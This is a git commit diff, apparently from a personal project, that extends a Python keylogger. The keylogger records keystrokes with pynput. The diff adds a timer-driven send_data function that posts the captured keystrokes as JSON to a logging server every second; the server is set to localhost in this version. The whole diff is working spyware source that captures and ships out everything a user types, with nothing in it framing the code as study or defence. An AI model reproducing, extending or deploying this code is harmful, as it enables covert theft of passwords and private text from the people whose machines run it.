9c14a1d7744d428062ffe6959713d893ad56d542
Richard Antal Nagy <nagy.richard.antal@gmail.com>
2022-08-12 18:47:10 +0200

    Added requests to keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,15 @@
+import json
+import threading
+import requests
+
 from pynput import keyboard
 from pynput.keyboard import Key, KeyCode
 
 
 server_ip = '127.0.0.1'
 server_port = 9998
+server_endpoint = 'logger'
+server_url = f'http://{server_ip}:{server_port}/{server_endpoint}'
 kill_switch = True
 debug_logging = True
 sending_interval = 1
@@ -59,6 +65,28 @@ def process_keypress(key : Key|KeyCode|None) -> bool|None:
         print(e)
         return
     
+def send_data():
+    global data
+    global server_ip
+    global server_port
+    global sending_interval
+    global server_url
+    
+    threading.Timer(sending_interval, send_data).start()    
+    if data == '':
+        return
+    
+    try:
+        requests.post(
+            server_url,
+            data=json.dumps({'data': data}),
+            headers={'Content-Type': 'application/json'}
+        )
+        data = ''
+    except Exception as e:
+        print(e)
+    
     
 with keyboard.Listener(on_press=process_keypress) as listener:
-        listener.join()
+    send_data()
+    listener.join()
